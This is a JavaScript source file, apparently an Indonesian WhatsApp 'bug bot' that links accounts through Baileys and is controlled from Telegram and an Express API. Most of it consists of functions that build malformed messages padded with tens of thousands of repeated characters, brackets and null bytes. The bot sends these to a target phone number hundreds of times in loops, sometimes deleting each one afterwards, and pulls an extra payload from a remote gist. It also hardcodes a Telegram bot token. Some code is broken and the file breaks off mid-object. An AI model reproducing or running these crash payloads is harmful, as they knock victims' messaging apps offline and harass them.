const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const TelegramBot = require("node-telegram-bot-api")
const axios = require("axios");
const express = require('express');
const P = require("pino");
const app = express();
const PORT = 2012;
app.use(express.json());
const pino = require('pino');
const readline = require('readline');
const crypto = require('crypto');
const path = require('path');
const unzipper = require('unzipper');
const Boom = require('@hapi/boom');
const { exec } = require('child_process');
const { spawn } = require("child_process");
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = './sessions';
const SESSIONS_FILE = './sessions/active_sessions.json';

if (!fs.existsSync("./zhee")) fs.mkdirSync("./zhee");
if (!fs.existsSync("./zhee/apikey.json")) fs.writeFileSync("./zhee/apikey.json", "{}");
const FILE_PATH = path.join(__dirname, "zhee", "database.json");

const telegramBotToken = "7700881086:AAEw-DP2oJ9XYGTxD1Xvua_2DtXAIWiamf0"; 
const ownerChatId = "8110087839";

const bot = new TelegramBot(telegramBotToken, { polling: true });

let sock;

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di http://localhost:${PORT}`);
  reconnectAllSessions();
});

function createSessionDir(botNumber) {
  const dir = path.join("./sessions", `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function saveActiveSessions(botNumber) {
  try {
    let data = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      data = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (data.includes(botNumber)) return;
    }
    data.push(botNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(data));
  } catch (e) {
    console.error("❌ Gagal simpan sesi:", e);
  }
}

async function connectToWhatsApp(botNumber, chatId, bot) {
  let statusMsg = await bot.sendMessage(chatId, `\`\`\`Pʀᴏsᴇs\n╰➤ Number  : ${botNumber} \n╰➤ Status : Loading...\`\`\``, {
    parse_mode: "Markdown",
  }).then(m => m.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`Pʀᴏsᴇs\n╰➤ Number  : ${botNumber} \n╰➤ Status : Menghubungkan ulang...\`\`\``,
          { chat_id: chatId, message_id: statusMsg, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, chatId, bot);
      } else {
        await bot.editMessageText(
          `\`\`\`Gagal\n╰➤ Number  : ${botNumber} \n╰➤ Status : Gagal Tersambung\`\`\``,
          { chat_id: chatId, message_id: statusMsg, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch {}
      }
    } else if (connection === "connecting") {
      await new Promise(res => setTimeout(res, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "ZYURAA12");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`Pᴀɪʀɪɴɢ\n╰➤ Number  : ${botNumber} \n╰➤ Status : Pairing\`\`\`\n╰➤ Kode : \`\`${formatted}\`\``,
            { chat_id: chatId, message_id: statusMsg, parse_mode: "Markdown" }
          );
        }
      } catch (err) {
        console.error("❌ Gagal Pairing:", err);
        await bot.editMessageText(
          `\`\`\`Error\n╰➤ Number  : ${botNumber} \n╰➤ Status : ${err.message}\`\`\``,
          { chat_id: chatId, message_id: statusMsg, parse_mode: "Markdown" }
        );
      }
    } else if (connection === "open") {
  try {
    sessions.set(botNumber, sock);
    saveActiveSessions(botNumber);

    await bot.editMessageText(
      `\`\`\`Success\n╰➤ Number  : ${botNumber} \n╰➤ Status : Terhubung\`\`\``,
      { chat_id: chatId, message_id: statusMsg, parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error saat proses 'open':", err);
  }
}
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

app.use(express.json());

function question(prompt) {
    return new Promise(resolve => rl.question(prompt, resolve));
}

async function sendMessage(target, text) {
    await sock.sendMessage(target, { text });
}

async function reconnectAllSessions() {
  if (!fs.existsSync(SESSIONS_FILE)) return;

  const data = JSON.parse(fs.readFileSync(SESSIONS_FILE));
  for (const nomor of data) {
    try {
      console.log(`🔄 Menghubungkan ulang ${nomor}...`);
      await connectToWhatsApp(nomor, ownerChatId, bot);
    } catch (err) {
      console.error(`❌ Gagal reconnect ${nomor}:`, err.message);
    }
  }
}

async function connectToWhatsAppWeb(botNumber) {
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });

  let pairingCode = null;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code && code >= 500 && code < 600) {
        console.log(`🔁 Reconnect: ${botNumber}`);
        await connectToWhatsAppWeb(botNumber);
      } else {
        console.log(`❌ Gagal konek: ${botNumber}`);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch {}
      }
    } else if (connection === "open") {
      console.log(`✅ Bot aktif: ${botNumber}`);
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
    }
  });

  sock.ev.on("creds.update", saveCreds);

  if (!sock.authState.creds.registered) {
    try {
      const code = await sock.requestPairingCode(botNumber, "ZYURAA12");
      pairingCode = code.match(/.{1,4}/g)?.join("-") || code;
      console.log(`🔗 Pairing ${botNumber}: ${pairingCode}`);
    } catch (err) {
      console.error("❌ Gagal pairing:", err.message);
    }
  }

  return { sock, pairingCode };
}

function getClientInfo(req) {
    return {
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown',
        method: req.method,
        timestamp: new Date().toISOString()
    };
}

function checkApikey(req, res, next) {
  const apikey = req.query.apikey;
  if (!apikey) return res.status(400).json({ error: "apikey dibutuhkan" });

  const path = "./zhee/apikey.json";
  if (!fs.existsSync(path)) return res.status(403).json({ error: "tidak ada database apikey" });

  const db = JSON.parse(fs.readFileSync(path));
  const data = db[apikey];
  if (!data) return res.status(403).json({ error: "apikey tidak valid" });

  const [dd, mm, yyyy] = data.expired.split("-");
  const expiredDate = new Date(`${yyyy}-${mm}-${dd}`);
  const now = new Date();
  if (now > expiredDate) return res.status(403).json({ error: "apikey sudah expired" });

  next();
}

// Function Nih Dekkk



async function LvsCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "XhinSar",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "🩸⃟༑⌁⃰ 𝐙𝐲𝐮 𝐫𝐚𝐚 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}

async function sadboy(sock, target) {
  for (let i = 0; i < 100; i++) {
    try {
      const msg = {
        viewOnceMessage: {
          message: {
            conversation: "👑 Zyuraa`X Conqueror 👑",
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            invitePaymentMessage: {
              currencyCodeIso4217: "USD",
              amount1000: "999999999",
              expiryTimestamp: "9999999999",
              requestFrom: target,
              serviceType: "🔞",
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𝐙𝐲𝐮𝐫𝐚𝐚`𝐗 𝐂𝐨𝐧𝐪𝐮𝐞𝐫𝐨𝐫",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            },
            interactiveMessage: {
              body: { text: "Zyuraa`X Bug Menu" },
              header: { title: "🚭" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select", 
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME\"},\"flow_cta\":\"CRASH\"}", 
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"Zyuraa`X\",\"extra\":\"{\\\"nested\\\":{\\\"DEFAULT\\\":\\\"X\\\"}}\"},\"flow_cta\":\"Conqueror\"}", 
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"...\"},\"flow_cta\":\"...\"}", 
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"spalsh\",\"nested\":{\"deep\":{\"zyuraa\":{\"level\":\"∞\",\"payload\":\"🔞\"}}}},\"flow_cta\":\"Conqueror\"}", 
                  }
                ],
                messageParamsJson: "{".repeat(2000) // panjang ekstrim
              }
            }
          }
        }
      };

      const sent = await sock.sendMessage(target, msg);
      await sock.sendMessage(target, { delete: sent.key });
    } catch (err) {
      console.error("❌ Crash error:", err);
    }
  }
}

async function sadboyi(sock, target) {
  for (let i = 0; i < 100; i++) {
    try {
      const msg = {
        viewOnceMessage: {
          message: {
            conversation: "Zyuraa`X Crash Mode",
          },
        },
      };

      const sent = await sock.sendMessage(target, msg, {
        contextInfo: {
          invitePaymentMessage: {
            currencyCodeIso4217: "USD",
            amount1000: "999999999",
            expiryTimestamp: "9999999999",
            requestFrom: target,
            serviceType: "🔞",
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "𝐙𝐲𝐮𝐫𝐚𝐚`𝐗 𝐂𝐨𝐧𝐪𝐮𝐞𝐫𝐨𝐫",
            newsletterJid: "0@newsletter",
            serverMessageId: 1,
          },          
        },
      });

      // versi simple delete
      await sock.sendMessage(target, { delete: sent.key });

    } catch (err) {
      console.error("❌ Crash error:", err);
    }
  }
}

async function LvsApi(target, ptcp = true) {
  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error("error fetching", err);
    return;
  }

  for (let r = 0; r < 666; r++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                isGroupMention: true, 
                participant: "0@s.whatsapp.net",
                remoteJid: "X",
                mentionedJid: [target],
                forwardedNewsletterMessageInfo: {
                  newsletterName: "𝐙𝐲𝐮𝐫𝐚𝐚`𝐗 𝐂𝐨𝐧𝐪𝐮𝐞𝐫𝐨𝐫",
                  newsletterJid: "120363350240801289@newsletter",
                  serverMessageId: 1
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: "🩸⃟༑⌁⃰𝐙𝐲𝐮𝐫𝐚𝐚 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
                  body: "",
                  thumbnailUrl: null,
                  sourceUrl: "https://zyuraa.app/",
                  mediaType: 1,
                  renderLargerThumbnail: true
                },
                  carouselMessage: {
                  cards,
                   messageVersion: 2
                },           
                dataSharingContext: {
                  showMmDisclosure: true,
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                  }
                }
              },
              header: {
                title: "",
                hasMediaAttachment: false
              },
              body: {
                text: "🩸⃟༑⌁⃰𝐙𝐲𝐮 𝐫𝐚𝐚 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Zyuraa - Beginner\",\"body\":\"Call Galaxy\"}",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "Eternity",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: apiClient + "Eternity",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: ""
                  },
                  {
                    name: "payment_status",
                    buttonParamsJson: ""
                  },
                  {
                    name: "review_order",
                    buttonParamsJson: ""
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });

    await sleep(5000);
    console.log("succes send bug");
  }
}

async function instantcrash(sock, target) {
  try {
  for (let i = 0; i < 300; i++) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: `linux⧽› ⟠\n馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/Devitazer${"𑇂𑆵𑆴𑆿".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME\"},\"flow_cta\":\":)\",\"flow_id\":\"BY ZYURAA\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}",
                }               
              ],
            },
          },
        },
      },
    };

    await sock.sendMessage(target, { delete: sent.key });

    }
  } catch (err) {
    console.log(err);
  } 
}

async function nativeSubmitSpamOnly(sock, target) {
  let apiClient;
  try {
    const res = await fetch(
      'https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json'
    );
    apiClient = await res.text();
  } catch (err) {
    console.error("❌ Failed to fetch apiClient:", err);
    return;
  }

  const flowPayload = {
    flow_action: "submit",
    flow_action_payload: { form_id: "ZYURAA_FORM" },
    flow_cta: "💣CRASH" + "𑁍".repeat(1000),
    flow_id: "Zyuraa_FLOW_" + "🧨".repeat(500),
    flow_token: "zyuraa_token",
    flow_message_version: "9",
    screen_params: { state: "init", error: "🦠".repeat(500) },
    flow_session_id: "ZY_" + "x".repeat(1000)
  };

  const payloadStr = JSON.stringify(flowPayload);

  for (let i = 0; i < 999; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                quotedMessage: {
                  body: {
                          text: `linux⧽› ⟠\n馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/Devitazer${"𑇂𑆵𑆴𑆿".repeat(200)}.com - _ #`
                       },
                       nativeFlowMessage: {
                        messageParamsJson: "[".repeat(1000),
                          buttons: [
                           {
                              name: "single_select",
                              buttonParamsJson: "",
                           },
                           {
                              name: "call_permission_request",
                              buttonParamsJson: "",
                           },
                           {
                           name: "mpm",
                           buttonParamsJson: "",
                           },
                           {
                          name: "mpm",
                          buttonParamsJson: "",
                           },
                           {
                          name: "mpm",
                          buttonParamsJson: "",
                           },
                           {
                          name: "mpm",
                          buttonParamsJson: "",
                           }
                         ]
                       }
                }
              },
              nativeFlowMessage: {
                messageParamsJson: payloadStr
              }
            }
          }
        }
      };

      const sent = await sock.relayMessage(target, message, {
        messageId: null,
        participant: { jid: target }
      });

      const msgKey = Object.keys(sent?.messages || {})[0];
      const msgId = sent.messages?.[msgKey]?.key?.id;

      if (msgId) {
        await sock.sendMessage(target, {
          delete: {
            remoteJid: target,
            fromMe: true,
            id: msgId,
            participant: sock.user.id
          }
        });
        console.log(`✅ Sent & Deleted: ${msgId}`);
      } else {
        console.log("⚠️ Failed to get message ID");
      }
    } catch (err) {
      console.error("❌ Error:", err);
    }
  }
}

async function flowinvo(sock, target) {
  let apiClient;
  try {
    const res = await fetch(
      'https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json'
    );
    apiClient = await res.text();
  } catch (err) {
    console.error("error fetching apiClient:", err);
    return;
  }

  try {
    const card = {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11753140_1408041796980913_2878655236644936200_n.enc?ccb=11-4&oh=01_Q5Aa1wEarRu_8kRB0MJuNq64ibgyP5E-f5zN5W29SwZdRKqWdA&oe=68873300&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/x-shockwave-flash",
          fileSha256: "dcj7EfgSV/wEK9wu7BlOgHsmr37vlegABLG9qbLPWBk=",
          fileLength: "4742600",
          seconds: 32,
          mediaKey: "R25d/0dLpnHMS3YiFuzd2p4wEz6IdYGB6sit1eDCd2U=",
          height: 848,
          width: 636,
          fileEncSha256: "pr+xzheA9Y7Ma5yXgR1SqZOwnZBpOqI2Sti9DrhEGXo=",
          directPath: "/v/t62.7161-24/11753140_1408041796980913_2878655236644936200_n.enc?ccb=11-4&oh=01_Q5Aa1wEarRu_8kRB0MJuNq64ibgyP5E-f5zN5W29SwZdRKqWdA&oe=68873300&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1751112394",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgANgMBIgACEQEDEQH/xAAuAAACAwEAAAAAAAAAAAAAAAAABQMEBgIBAQEBAQAAAAAAAAAAAAAAAAECAAP/2gAMAwEAAhADEAAAAM8xha9IlpVL+1Va4goXADrVTvuXKN52Lly7SqjJzsuLrnDsprVFeaa6jIjUCyJkQLLmhyU2NTwtlltFUygAoAMdXwdOBO//xAAjEAACAwACAgIDAQEAAAAAAAABAgADBBExEiHFEBTg=="
        },
        hasMediaAttachment: true
      },
      body: {
        text: "WhatsΛpp"
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      },
      paymentInviteMessage: {
        currencyCodeIso4217: "INR",
        amount1000: 1,
        expiryTimestamp: 999999999,
        note: "WhatsΛpp" + "{".repeat(9000)
      },
      contextInfo: {
        mentionedJid: [target],
        forwardingScore: 1,
        isForwarded: true,
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        quotedMessage: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/11753140_1408041796980913_2878655236644936200_n.enc?ccb=11-4&oh=01_Q5Aa1wEarRu_8kRB0MJuNq64ibgyP5E-f5zN5W29SwZdRKqWdA&oe=68873300&_nc_sid=5e03e0&mms3=true",
            mimetype: "text/vcard",
            fileSha256: "dcj7EfgSV/wEK9wu7BlOgHsmr37vlegABLG9qbLPWBk=",
            fileLength: "4742600",
            seconds: 32,
            mediaKey: "R25d/0dLpnHMS3YiFuzd2p4wEz6IdYGB6sit1eDCd2U=",
            height: 848,
            width: 636,
            fileEncSha256: "pr+xzheA9Y7Ma5yXgR1SqZOwnZBpOqI2Sti9DrhEGXo=",
            directPath: "/v/t62.7161-24/11753140_1408041796980913_2878655236644936200_n.enc?ccb=11-4&oh=01_Q5Aa1wEarRu_8kRB0MJuNq64ibgyP5E-f5zN5W29SwZdRKqWdA&oe=68873300&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1751112394",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgANgMBIgACEQEDEQH/xAAuAAACAwEAAAAAAAAAAAAAAAAABQMEBgIBAQEBAQAAAAAAAAAAAAAAAAECAAP/2gAMAwEAAhADEAAAAM8xha9IlpVL+1Va4goXADrVTvuXKN52Lly7SqjJzsuLrnDsprVFeaa6jIjUCyJkQLLmhyU2NTwtlltFUygAoAMdXwdOBO//xAAjEAACAwACAgIDAQEAAAAAAAABAgADBBExEiHFEBTg=="
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(10000)
        }
      }
    };

    for (let r = 0; r < 666; r++) {
      const message = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: target
                },
                participant: target,
                quotedMessage: {
                  nativeFlowMessage: {
                    name: "rainbow_message",
                    body: {
                      text: "Kontol" + "$".repeat(9000)
                    },
                    messageParamsJson: "{".repeat(10000),
                    buttonParamsJson: "{".repeat(50000),
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "Zyuraa`X Forever" + apiClient + "@".repeat(9000)
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "Zyuraa`X Forever" + apiClient + "&".repeat(9000)
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "Zyuraa`X Forever" + apiClient + "{".repeat(9000)
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "Zyuraa`X Forever" + apiClient + "#".repeat(9000)
                      }
                    ]
                  }
                }
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
              },
              carouselMessage: {
                cards: [card, card, card, card, card, card, card, card, card, card, card]
              }
            }
          }
        }
      };

      await sock.relayMessage(target, message, {
        messageId: null,
        participant: { jid: target }
      });

      console.log("✅ Zyuraa`X Send!");
    }
  } catch (err) {
    console.log("❌ Failed to send bug:", err);
  }
}

async function simpleBug(sock, target) {
  const msg = {
    key: {
      remoteJid: target,
      fromMe: true
    },
    message: {
      nativeFlowMessage: {
        buttonParamsJson: "{".repeat(50000),
        buttons: [
          {
            buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME\"},\"flow_cta\":\":)\",\"flow_id\":\"BY ZYURAA\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
          }
        ]
      }
    }
  };

  try {
    await sock.relayMessage(target, msg.message, { messageId: sock.generateMessageTag() });
    console.log("✅ Bug sent to", target);
  } catch (err) {
    console.error("❌ Failed to send bug:", err);
  }
}

async function hardButtonViewOnce(sock, target) {
for (let r = 0; r < 666; r++) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            quotedMessage: {
              liveLocationMessage: {
                degreesLatitude: 999.999999,
                degreesLongitude: 999.999999,    
                name: "https://t.me/cloudiced",
                addres: "Zyuraa`X Forever" + "@1".repeat(7000)
              },
            },
          },
          body: {
            text: "DEFAULTi",
          },        
          nativeFlowButtons: [
            {
              name: "single_select",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
            {
              name: "mpm",
              buttonParamsJson: "",
            },
            {
              name: "call_request",
              buttonParamsJson: "",
            },
            {
              name: "single_select",
              buttonParamsJson: "",
            },
          ],
          messageParamsJson: "{".repeat(10000),
        },
      },
    },
  };

  try {
    await sock.sendMessage(target, msg);
    console.log("✅ ViewOnce Hard Buttons sent!");
  } catch (err) {
    console.error("❌ Failed to send hard button viewonce:", err);
  }
 }
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "💎⃢ ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻ ⃢↯🔥" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
